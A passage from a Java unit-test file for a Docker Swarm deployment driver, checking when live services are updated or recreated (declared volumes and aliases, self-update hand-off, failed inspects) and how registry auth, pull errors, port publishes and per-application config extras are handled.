    assertEquals(
        List.of("docker", "service", "rm", "dev-qits-gateway"), cli.matching("service rm"));
    List<String> created = cli.matching("service create");
    assertTrue(
        created.containsAll(
            List.of("--mount", "type=volume,source=qits-gateway-data,target=/data")),
        created.toString());
    // …and the mount the live service already had, which config still states, is not lost: it is
    // rendered from the extras exactly as it always was.
    assertTrue(cli.count("ps --quiet") > 0, "the task is waited out before the successor starts");
  }

  @Test
  void aLiveServiceWithConfigMountsAndNoDeclarationsIsUPDATEDANDNOTRECREATED() {
    // THIS IS THE TEST THAT PROTECTS THE ESTATE — do not delete it. Every service running today
    // carries extras-supplied mounts and declares none of them. A symmetric "the two sets differ"
    // comparison would read that as a shape change and remove and recreate every service on the
    // platform on its next deployment, each losing its writable layer. The rule is one-directional:
    // only a DECLARED volume that is missing is a reason to create, and an application that
    // declares nothing spends no inspect and takes the update path untouched.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
    cli.script(
        "ContainerSpec.Mounts",
        result(0, "qits-gateway-data|/data\n/var/run/docker.sock|/var/run/docker.sock\n"));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, applied.outcome());
    assertTrue(cli.matching("service rm").isEmpty(), "nothing is ever recreated to REMOVE a mount");
    assertFalse(cli.matching("service update").isEmpty(), "the ordinary update path, untouched");
    assertEquals(
        0,
        cli.count("ContainerSpec.Mounts"),
        "an application that declares no volume is not even asked about them");
  }

  @Test
  void aDeclaredVolumeTheLiveServiceAlreadyHasIsAnOrdinaryUpdate() {
    // The state every migrated application settles into: the declaration and the config entry say
    // the same thing, the live service already carries it, and a deployment is a deployment.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
    cli.script("ContainerSpec.Mounts", result(0, "qits-gateway-data|/data\n"));

    driver.apply(spec(List.of(new DeploymentDriver.VolumeMount("qits-gateway-data", "/data", false))));

    assertTrue(cli.matching("service rm").isEmpty());
    assertFalse(cli.matching("service update").isEmpty());
  }

  @Test
  void theSameTargetFedByAnotherVolumeIsNotThisVolume() {
    // Matching on the target alone would call the declaration satisfied by whatever happens to be
    // mounted there — the application's storage under the name it had before, or somebody else's —
    // and the declared volume would never arrive.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
    cli.script("ContainerSpec.Mounts", result(0, "an-older-name|/data\n"));

    driver.apply(spec(List.of(new DeploymentDriver.VolumeMount("qits-gateway-data", "/data", false))));

    assertFalse(cli.matching("service rm").isEmpty(), "the declared volume is still missing");
  }

  @Test
  void anInspectThatCannotAnswerRecreatesNothing() {
    // The env diff's stance, one step more strictly: that one risks carrying a stale variable for
    // one more deployment, and this one risks destroying a running service over a CLI call that
    // failed. The next deployment asks again.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
    cli.script("ContainerSpec.Mounts", result(1, "Error: No such service"));

    driver.apply(spec(List.of(new DeploymentDriver.VolumeMount("qits-gateway-data", "/data", false))));

    assertTrue(cli.matching("service rm").isEmpty(), "a failed inspect is never a reason to remove");
    assertFalse(cli.matching("service update").isEmpty());
  }

  @Test
  void theDeployersOwnServiceIsNeverRemovedToGiveItAVolume() {
    // A self-update is handed to the swarm manager precisely because neither instance can arbitrate
    // its own succession. Removing the service this process answers on would leave nothing to
    // create the successor — the scale-to-zero stance, for the same reason.
    SwarmDeploymentDriver driver = driver();
    driver.hostnameFile = hostnameFile("task-container-id");
    cli.script("Config.Labels", result(0, "dev-qits-gateway"));
    cli.script("--format {{.ID}}", result(0, "svc123"));
    cli.script("ContainerSpec.Mounts", result(0, ""));

    DeploymentDriver.ApplyResult applied =
        driver.apply(spec(List.of(new DeploymentDriver.VolumeMount("qits-gateway-data", "/data", false))));

    assertEquals(DeploymentDriver.ApplyOutcome.HANDED_OFF, applied.outcome());
    assertTrue(cli.matching("service rm").isEmpty(), "never its own service");
  }

  @Test
  void aDeclaredAliasMissingFromTheLiveServiceIsRemovedAndCreatedAgain() {
    // THE LEVER THAT MAKES A DECLARED ALIAS REACH THE FLEET. buildUpdateArgv states no networks, an
    // attachment is restated whole or not at all, and swarm has no add-an-alias — so an alias
    // reaches a service that is ALREADY RUNNING by exactly one route: a `service rm` and a create.
    //
    // What drove the arm here used to be the DERIVED alias — the environment-qualified name a
    // platform service was granted beside its bare one. Measured on the estate before it landed:
    // qits-platform-idp resolved and dev-qits-platform-idp did not, after two deployments carrying
    // the declaration. That derivation is gone with the plane (the qualified name is the service's
    // own name now), so the arm is exercised where it still has work to do: an alias deployment
    // config DECLARES. The mechanism is the one thing that did not change, and it must not rot just
    // because its first customer was retired.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
                "registry.dev.localhost"));
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
    cli.script("TaskTemplate.Networks", result(0, ""));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, applied.outcome());
    assertTrue(cli.matching("service update").isEmpty(), "an update could never carry the alias");
    assertEquals(List.of("docker", "service", "rm", "dev-qits-gateway"), cli.matching("service rm"));
    List<String> created = cli.matching("service create");
    // The NAME is the wire alias and is untouched by any of this; what the recreate is FOR is the
    // attachment, which is the one thing a `service update` can never restate.
    assertTrue(created.containsAll(List.of("--name", "dev-qits-gateway")), created.toString());
    assertTrue(created.contains("name=qits-net,alias=registry.dev.localhost"), created.toString());
    assertTrue(cli.count("ps --quiet") > 0, "the task is waited out before the successor starts");
  }

  @Test
  void aDeclaredAliasTheLiveServiceAlreadyAnswersToIsAnOrdinaryUpdate() {
    // What a service settles into after its one recreate: the declaration and the live attachment
    // say the same thing, and a deployment is a deployment. This is what stops the arm above from
    // recreating the same service on every deployment forever. It read the derived platform alias
    // before the plane was deleted and reads a config-declared one now — the same claim about the
    // same comparison, off the only kind of alias that still exists.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
                "registry.dev.localhost"));
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
    cli.script("TaskTemplate.Networks", result(0, "registry.dev.localhost\n"));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, applied.outcome());
    assertTrue(cli.matching("service rm").isEmpty(), "it recreates once, not every time");
    assertFalse(cli.matching("service update").isEmpty(), "the ordinary update path, untouched");
  }

  @Test
  void aLiveServiceWithAliasesAndNoDeclarationsIsUPDATEDANDNOTRECREATED() {
    // THIS IS THE TEST THAT PROTECTS THE ESTATE — do not delete it. It is the alias twin of
    // aLiveServiceWithConfigMountsAndNoDeclarationsIsUPDATEDANDNOTRECREATED and it protects the
    // same thing: the rule is one-directional. Only a DECLARED alias that is MISSING is a reason to
    // recreate. An alias the live service carries that nothing declares is none, and a symmetric
    // "the two sets differ" comparison would remove and recreate services across the platform on
    // their next deployment, each losing its writable layer for nothing anybody asked for.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
                "registry.dev.localhost"));
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
    cli.script(
        "TaskTemplate.Networks",
        result(0, "registry.dev.localhost\nan-alias-an-operator-added-by-hand\n"));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, applied.outcome());
    assertTrue(cli.matching("service rm").isEmpty(), "nothing is ever recreated to REMOVE an alias");
    assertFalse(cli.matching("service update").isEmpty());
  }

  @Test
  void anApplicationThatDeclaresNoAliasIsNotEvenAskedAboutThem() {
    // The other half of the estate protection, and it is what keeps this free: nothing derives an
    // alias for any service any more, so an application that declares none in config asks the whole
    // question for no CLI call at all — the shape missingDeclaredVolume takes for the services that
    // declare no volume. It was already true of an environment service before the plane was
    // deleted; it is true of every service now, which is why this is the ordinary case and not a
    // plane's exemption.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));

    driver.apply(spec());

    assertEquals(0, cli.count(SwarmDeploymentDriver.SPEC_NETWORK_ALIASES_FORMAT));
    assertTrue(cli.matching("service rm").isEmpty());
    assertFalse(cli.matching("service update").isEmpty());
  }

  @Test
  void anAliasInspectThatCannotAnswerRecreatesNothing() {
    // The volume arm's stance, for the same reason: this risks destroying a running service over a
    // CLI call that failed, where carrying the alias one deployment longer risks nothing at all.
    // The next deployment asks again.
    //
    // It used to stage the case with a PLATFORM spec, because the derived tier-qualified alias was
    // the only alias a fixture needed no config for. With the plane deleted there is no derived
    // alias, and a service that declares none is never asked about them at all — so the inspect
    // this test is about would never be issued and the assertions would pass saying nothing. The
    // alias is declared in config, which is what puts a real inspect on the wire to fail.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
                "registry.dev.localhost"));
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
    cli.script("TaskTemplate.Networks", result(1, "Error: No such service"));

    driver.apply(spec());

    assertTrue(cli.matching("service rm").isEmpty(), "a failed inspect is never a reason to remove");
    assertFalse(cli.matching("service update").isEmpty());
  }

  @Test
  void theDeployersOwnServiceIsNeverRemovedToGiveItAnAlias() {
    // The one member of the fleet that must never take this arm. Removing the service this process
    // answers on would leave nothing to create the successor; the alias waits for a hand that is
    // not this one.
    //
    // The deployer used to be a PLATFORM service, which is how this test used to stage itself — a
    // platform spec, the bare `qits-gateway` label, and the derived alias as the thing being
    // withheld. There is no plane and no derived alias, so the deployer is an ordinary service
    // named after its wire alias like everything else, and the alias it would be recreated for is
    // one config declares. The claim is untouched: a self-update does not even ASK, because no
    // answer could make removing itself right.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
                "registry.dev.localhost"));
    driver.hostnameFile = hostnameFile("task-container-id");
    cli.script("Config.Labels", result(0, "dev-qits-gateway"));
    cli.script("--format {{.ID}}", result(0, "svc123"));
    cli.script("TaskTemplate.Networks", result(0, ""));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.HANDED_OFF, applied.outcome());
    assertTrue(cli.matching("service rm").isEmpty(), "never its own service");
    assertEquals(
        0,
        cli.count(SwarmDeploymentDriver.SPEC_NETWORK_ALIASES_FORMAT),
        "a self-update does not even ask: no answer could make removing itself right");
  }

  @Test
  void theUpdateOrderIsTheRepositorysAndStopFirstIsTheOptOut() {
    List<String> argv =
        driver()
            .buildUpdateArgv(
                spec(
                    DeploymentDriver.UpdateOrder.STOP_FIRST,
                    List.of()),
                "dev-qits-gateway");

    assertTrue(argv.containsAll(List.of("--update-order", "stop-first")), argv.toString());
    // It still rolls back — it just has a gap in service, which is what those applications have
    // today anyway.
    assertTrue(argv.containsAll(List.of("--update-failure-action", "rollback")));
  }

  @Test
  void nothingCarriesARegistryCredentialUntilTheKeySaysSo() {
    // The shipped state, and it is stated rather than assumed: reads on the platform's registry are
    // anonymous today, so both argvs are what they were byte for byte.
    assertFalse(
        driver()
            .buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"))
            .contains("--with-registry-auth"));
    assertFalse(
        driver().buildUpdateArgv(spec(), "dev-qits-gateway").contains("--with-registry-auth"));
  }

  @Test
  void theCredentialRidesBothArgvsSoTheAGENTSPullIsAuthenticatedToo() {
    // The flag serialises the CLI's credential into the service spec, which is what the swarm agent
    // pulls with. The warm-up `docker pull` is this process's own and proves nothing about the node
    // — so a create that carried it and an update that did not would authenticate the first
    // deployment of a service and refuse every one after it.
    SwarmDeploymentDriver driver = driver();
    driver.registryAuth = true;

    assertTrue(
        driver
            .buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"))
            .contains("--with-registry-auth"));
    assertTrue(driver.buildUpdateArgv(spec(), "dev-qits-gateway").contains("--with-registry-auth"));
    // It sits beside --no-resolve-image rather than instead of it: one says do not turn the tag
    // into a digest, the other says hand the agents a credential for the pull they do later.
    assertTrue(
        driver
            .buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"))
            .contains("--no-resolve-image"));
  }

  @Test
  void aRefusedPullIsItsOwnOutcomeInEveryWordingDockerHasForIt() {
    // Each of these is a real docker phrasing, and the first is the one that used to be read as a
    // missing image — it carries "repository does not exist" inside it, which is why the refusal
    // list is asked first.
    List<String> refusals =
        List.of(
            "Error response from daemon: pull access denied for qits/qits-gateway, repository does"
                + " not exist or may require 'docker login'",
            "denied: requested access to the resource is denied: authorization failed",
            "no basic auth credentials",
            "unauthorized: authentication required");

    for (String refusal : refusals) {
      SwarmDeploymentDriver driver = driver();
      cli.script("pull", result(1, refusal));

      DeploymentDriver.PullResult pulled = driver.pull(IMAGE);

      assertEquals(DeploymentDriver.PullOutcome.AUTH_REFUSED, pulled.outcome(), refusal);
      assertTrue(pulled.detail().contains(refusal), pulled.detail());
    }
  }

  @Test
  void anAbsentTagIsStillAMissingImage() {
    // The narrowed meaning: the registry answered and has no such thing, which indicts the
    // repository's own publishing step and nothing about a credential.
    for (String absence : List.of("manifest unknown", "Error: image not found", "name unknown")) {
      SwarmDeploymentDriver driver = driver();
      cli.script("pull", result(1, absence));

      assertEquals(
          DeploymentDriver.PullOutcome.IMAGE_MISSING, driver.pull(IMAGE).outcome(), absence);
    }
  }

  @Test
  void aFailureNeitherListRecognisesIsStillAnError() {
    // The narrowness rule, unchanged by the second list: a daemon that is down must never read as
    // "nothing published this build" and must never read as "check the credential" either.
    SwarmDeploymentDriver driver = driver();
    cli.script("pull", result(1, "Cannot connect to the Docker daemon at unix:///var/run/docker.sock"));

    assertEquals(DeploymentDriver.PullOutcome.ERROR, driver.pull(IMAGE).outcome());
  }

  @Test
  void everyExtraIsRenderedInSwarmsOwnSpelling() {
    // Nothing is translated out of a docker argv any more: config states mounts, publishes, groups
    // and environment, and this is what they are called on a service create.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.mounts[0]", "volume:qits-data:/data",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.mounts[1]",
                    "bind:/var/run/docker.sock:/var/run/docker.sock",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.mounts[2]",
                    "volume:qits-docs:/docs:ro",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.groups[0]", "992",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.env.FOO", "bar",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.publishes[0]", "8081:8080",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.publishes[1]", "5353:8053/udp"));

    List<String> argv = driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));

    assertTrue(argv.containsAll(List.of("--mount", "type=volume,source=qits-data,target=/data")));
    assertTrue(
        argv.containsAll(
            List.of("--mount", "type=bind,source=/var/run/docker.sock,target=/var/run/docker.sock")),
        argv.toString());
    assertTrue(
        argv.containsAll(List.of("--mount", "type=volume,source=qits-docs,target=/docs,readonly")));
    assertTrue(argv.containsAll(List.of("--group", "992")));
    assertTrue(argv.containsAll(List.of("--env", "FOO=bar")));
    // mode=host rather than the ingress default: it is per node, like a plain `docker run`, and
    // this platform is one node.
    assertTrue(argv.containsAll(List.of("--publish", "published=8081,target=8080,mode=host")));
    assertTrue(
        argv.containsAll(List.of("--publish", "published=5353,target=8053,protocol=udp,mode=host")),
        argv.toString());
    assertEquals(IMAGE, argv.get(argv.size() - 1));
  }

  @Test
  void anIngressServiceHandsItsPortToTheRoutingMeshAndKeepsStartFirst() {
    // The mode is the repository's publish_mode, and it is the whole of what changes: the port is
    // held by the mesh rather than by the task, so the successor can start while the predecessor
    // is still serving — which is why the update order stays start-first beside it.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.publishes[0]", "8080:8080",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.publishes[1]", "5353:8053/udp"));

    List<String> argv =
        driver.buildCreateArgv(
            spec(
                DeploymentDriver.UpdateOrder.START_FIRST,
                DeploymentDriver.PublishMode.INGRESS,
                List.of()),
            "dev-qits-gateway",
            List.of("qits-net"));

    assertTrue(
        argv.containsAll(List.of("--publish", "published=8080,target=8080,mode=ingress")),
        argv.toString());
    assertTrue(
        argv.containsAll(
            List.of("--publish", "published=5353,target=8053,protocol=udp,mode=ingress")),
        argv.toString());
    assertTrue(argv.containsAll(List.of("--update-order", "start-first")), argv.toString());
  }

  @Test
  void anIngressServiceThatDeclaresStopFirstStillGetsStopFirst() {
    // The two keys are independent statements and nothing derives one from the other: a repository
    // that has a reason to say stop-first is not overruled by its publish mode.
    List<String> argv =
        driver()
            .buildUpdateArgv(
                spec(
                    DeploymentDriver.UpdateOrder.STOP_FIRST,
                    DeploymentDriver.PublishMode.INGRESS,
                    List.of()),
                "dev-qits-gateway");

    assertTrue(argv.containsAll(List.of("--update-order", "stop-first")), argv.toString());
  }

  @Test
  void anIngressPublishStillCannotNameAnAddress() {
    // Swarm's publish has no ip field in EITHER mode, so the refusal is the mode-independent one:
    // ingress binds 0.0.0.0 exactly as host does, and the mode changes who holds the port rather
    // than who can reach it.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.publishes[0]",
                "127.0.0.1:9000:9000"));

    ServiceExtras.Refused refused =
        assertThrows(
            ServiceExtras.Refused.class,
            () ->
                driver.buildCreateArgv(
                    spec(
                        DeploymentDriver.UpdateOrder.START_FIRST,
                        DeploymentDriver.PublishMode.INGRESS,
                        List.of()),
                    "dev-qits-gateway",
                    List.of("qits-net")));
    assertTrue(refused.getMessage().contains("127.0.0.1"), refused.getMessage());
  }

  @Test
  void aPublishThatDemandsAnIpIsRefusedRatherThanWidened() {
    // Swarm's publish syntax has no ip field in either mode — measured: a host-mode publish listens
    // on 0.0.0.0. A port that was deliberately on loopback must not quietly become a port on every
    // interface, so the deployment is refused and says which port and which address.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.publishes[0]",
                "127.0.0.1:9000:9000"));

    ServiceExtras.Refused refused =
        assertThrows(
            ServiceExtras.Refused.class,
            () -> driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net")));
    assertTrue(refused.getMessage().contains("127.0.0.1"), refused.getMessage());

    // Nothing was applied: the argv is built before the command runs, so the deployment is a
    // refusal with the detail on the row and a platform that did not change.
    cli.script("--format {{.ID}}", result(1, "no such service"));
    DeploymentDriver.ApplyResult applied = driver.apply(spec());
    assertEquals(DeploymentDriver.ApplyOutcome.REFUSED, applied.outcome());
    assertTrue(applied.detail().contains("9000"), applied.detail());
    assertTrue(cli.matching("service create").isEmpty(), "nothing was created");
  }

  @Test
  void everyInterfaceIsSaidOutLoudRatherThanImplied() {
    // The registry's publish is dialled by the HOST's docker daemon, so it cannot be private to the
    // overlay. 0.0.0.0 is how the generated config says that on purpose — and it is the one ip
    // swarm can honour, because it is the one it does anyway.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.publishes[0]", "0.0.0.0:8081:8080"));

    assertTrue(
        driver
            .buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"))
            .containsAll(List.of("--publish", "published=8081,target=8080,mode=host")));
  }

  @Test
  void anUnreadableExtraRefusesTheDeployment() {
    // Config is typed now, so an unknown key is a bug rather than a word this driver does not
    // speak. It used to be a WARN and a dropped flag — a container that boots without its volume.
    SwarmDeploymentDriver driver =
        driver(Map.of(DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.add-hosts[0]", "a:1.2.3.4"));

    assertThrows(
        ServiceExtras.Refused.class,
        () -> driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net")));
  }

  @Test
  void extrasOfAnotherApplicationDoNotLeakIn() {
    // The absence is the assertion that matters: only the deployed application's own keys reach
    // its argv, so one application's socket bind cannot ride along on a sibling's deployment —
    // including a sibling whose name merely starts with this one's.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-workspaces.mounts[0]",
                    "bind:/var/run/docker.sock:/var/run/docker.sock",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway-daemon.mounts[0]",
                    "bind:/var/run/docker.sock:/var/run/docker.sock"));

    List<String> argv = driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));

    assertEquals(IMAGE, argv.get(argv.size() - 1));
    assertTrue(argv.stream().noneMatch(argument -> argument.contains("docker.sock")));
  }

  @Test
  void theExtrasAreAskedForThisDeploymentsOwnPlaceAndRelease() {
    // The read is addressed by (application, environment, version) now, and all three have to be
    // THIS spec's. It is worth a test of its own rather than being implied by the argv, because the
    // argv looks identical whichever place the answer came from: a builder that passed the wrong
    // tier would produce a perfectly well-formed service carrying another environment's config, on
    // both planes, silently. Once per argv, still — the tuple is recorded per call.
    List<List<String>> asked = new ArrayList<>();
    SwarmDeploymentDriver driver =
        driver(
            (application, environmentName, version, declarationSeeded) -> {
              asked.add(
                  List.of(application, environmentName, version, String.valueOf(declarationSeeded)));
              return new SmallRyeConfigBuilder().build();
            });

    driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));

    assertEquals(List.of(List.of("qits-gateway", "dev", VERSION, "true")), asked);
  }

  @Test
  void whetherTheReleaseDeclaredAnythingReachesTheExtrasReadOnBothArgvs() {
    // The fourth value on the read, and the one the argv cannot show either: a release that seeded
    // no declaration has to be read version-less, because the store answers 404 for a version it
    // holds none for. Passed unconditionally, every deployment of every repository without a
    // .config/qits/configuration.yml refused its extras read and left the old container serving —
    // so the flag is carried from where it is known (DeployService, at seed time) all the way down
    // here, and BOTH builders have to hand it on or the create and the update disagree about one
    // deployment.
    List<Boolean> asked = new ArrayList<>();
    SwarmDeploymentDriver driver =
        driver(
            (application, environmentName, version, declarationSeeded) -> {
              asked.add(declarationSeeded);
              return new SmallRyeConfigBuilder().build();
            });
    DeploymentDriver.ServiceSpec undeclared = undeclared(spec());

    driver.buildCreateArgv(undeclared, "dev-qits-gateway", List.of("qits-net"));
    driver.buildUpdateArgv(undeclared, "dev-qits-gateway");

    assertEquals(List.of(false, false), asked);
  }

  /** The same spec, from a release whose tag carried no declaration. */
  private static DeploymentDriver.ServiceSpec undeclared(DeploymentDriver.ServiceSpec spec) {
    return new DeploymentDriver.ServiceSpec(
        spec.environmentId(),
        spec.environmentName(),
        spec.applicationId(),
        spec.applicationName(),
        spec.deploymentId(),
        spec.commitSha(),
        spec.version(),
        false,
        spec.deploymentName(),
        spec.wireAlias(),
        spec.networks(),
        spec.imageRef(),
        spec.healthPath(),
        spec.healthCmd(),
        spec.availableOnEnv(),
        spec.updateOrder(),
        spec.publishMode(),
        spec.resources(),
        spec.volumes());
  }

  @Test
  void anExtrasFileEditedAfterBootReachesTheNextArgv() throws IOException {
    // The 2026-08-16 failure, on both argv builders: the boot config had read the config volume's
    // file once, so a deployment re-stamped last boot's value over a fix applied to the live
    // service. Both builders read the file, and the file outranks the boot config.
    Path file = Files.createTempFile("qits-extras", ".properties");
    file.toFile().deleteOnExit();
    Files.writeString(
        file,
        DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.env.QITS_EVENTS_URL=http://dev-qits-events:9090\n");
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.env.QITS_EVENTS_URL",
                "http://dev-qits-events:8080"),
            file.toString());

    assertTrue(
        driver
            .buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"))
            .containsAll(List.of("--env", "QITS_EVENTS_URL=http://dev-qits-events:9090")),
        "the file the operator edited, not the config this process booted with");

    // Edited again while this process runs, which is the whole point of reading it per argv.
    Files.writeString(
        file,
        DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.env.QITS_EVENTS_URL=http://dev-qits-events:9191\n");

    assertTrue(
        driver
            .buildUpdateArgv(spec(), "dev-qits-gateway")
            .containsAll(List.of("--env-add", "QITS_EVENTS_URL=http://dev-qits-events:9191")),
        "an update states the environment in full, so an edit reaches a live service");
  }

  @Test
  void anExtrasFileThatCannotBeReadIsARefusedDeploymentRatherThanTheBootValues() throws IOException {
    // A fall-back would ship the stale values invisibly: a green deployment carrying whatever the
    // process booted with. A directory is the portable unreadable file — a chmod 000 one is still
    // readable to root.
    Path directory = Files.createTempDirectory("qits-extras");
    directory.toFile().deleteOnExit();
    SwarmDeploymentDriver driver = driver(Map.of(), directory.toString());

    cli.script("--format {{.ID}}", result(1, "no such service"));
    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.REFUSED, applied.outcome());
    assertTrue(applied.detail().contains(directory.toString()), applied.detail());
    assertTrue(cli.matching("service create").isEmpty(), "nothing was created");
  }

  @Test
  void whatQitsConfigurationServesReachesBothArgvs() {
    // The whole of WP2 from the argv's side: with an extras-url set, the service is where a
    // deployment's mounts, ports and environment come from — on the create AND on the update, since
    // an update states the environment in full and a live service is what an operator is fixing.
    try (ExtrasStub configuration = new ExtrasStub()) {
      configuration.resolves(
          11,
          DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.env.QITS_EVENTS_URL",
          "http://dev-qits-events:8080",
          DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.mounts[0]",
          "volume:qits-gateway-data:/data");
      ConfigHostExtrasSource extras =
          configuration.source(
              new SmallRyeConfigBuilder()
                  .withSources(new PropertiesConfigSource(Map.of(), "test", 100))
                  .build(),
              "config/application.properties",
              Optional::empty);
      SwarmDeploymentDriver driver = driver(extras);

      assertTrue(
          driver
              .buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"))
              .containsAll(
                  List.of(
                      "--env",
                      "QITS_EVENTS_URL=http://dev-qits-events:8080",
                      "--mount",
                      "type=volume,source=qits-gateway-data,target=/data")),
          "a create carries the whole of what the service states");
      assertTrue(
          driver
              .buildUpdateArgv(spec(), "dev-qits-gateway")
              .containsAll(List.of("--env-add", "QITS_EVENTS_URL=http://dev-qits-events:8080")),
          "and an update carries the environment half of it");
    }
  }

  @Test
  void anUnreachableConfigurationServiceRefusesRatherThanDeployingTheFileValues() {
    // The refusal has to arrive as a REFUSED deployment naming the url, and it has to arrive with
    // nothing created: a fall-back to the config volume's file would ship the stale value this
    // service exists to replace, invisibly, as a green deployment.
    String unreachable = "http://127.0.0.1:1";
    ConfigHostExtrasSource extras =
        ExtrasStub.source(
            new SmallRyeConfigBuilder()
                .withSources(
                    new PropertiesConfigSource(
                        Map.of(
                            DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.env.QITS_EVENTS_URL",
                            "http://stale:8080"),
                        "test",
                        100))
                .build(),
            "config/application.properties",
            Optional::empty,
            unreachable);
    SwarmDeploymentDriver driver = driver(extras);

    cli.script("--format {{.ID}}", result(1, "no such service"));
    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.REFUSED, applied.outcome());
    assertTrue(applied.detail().contains(unreachable), applied.detail());
    assertTrue(cli.matching("service create").isEmpty(), "nothing was created");
  }

  @Test
  void theEnvironmentIsRestatedOnAnUpdateBecauseAnAddressCanChange() {
    // A service update keeps the shape it is not asked to change — mounts and ports stay — but a
    // variable is a value rather than a shape: config naming a new address is what the next
    // deployment is supposed to carry.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.env.QITS_EVENTS_URL",
                    "http://dev-qits-events:8080",
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.mounts[0]", "volume:qits-data:/data"));

    List<String> argv = driver.buildUpdateArgv(spec(), "dev-qits-gateway");

    assertTrue(
        argv.containsAll(List.of("--env-add", "QITS_EVENTS_URL=http://dev-qits-events:8080")),
        argv.toString());
    assertTrue(argv.stream().noneMatch(argument -> argument.startsWith("--mount")));
  }

  @Test
  void anUpdateRemovesAnEnvKeyTheExtrasNoLongerState() {
    // The defect the flip's own proof found on 2026-08-17: an update only ever --env-add'ed, so an
    // entry DELETED from an application's extras stayed on the live service until somebody removed
    // the service by hand. Deleting an entry is half of what configuration-as-state is for.
    SwarmDeploymentDriver driver =
        driver(
            Map.of(
                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.env.QITS_EVENTS_URL",
                "http://dev-qits-events:8080"));
    cli.script(
        SwarmDeploymentDriver.SPEC_ENV_FORMAT,
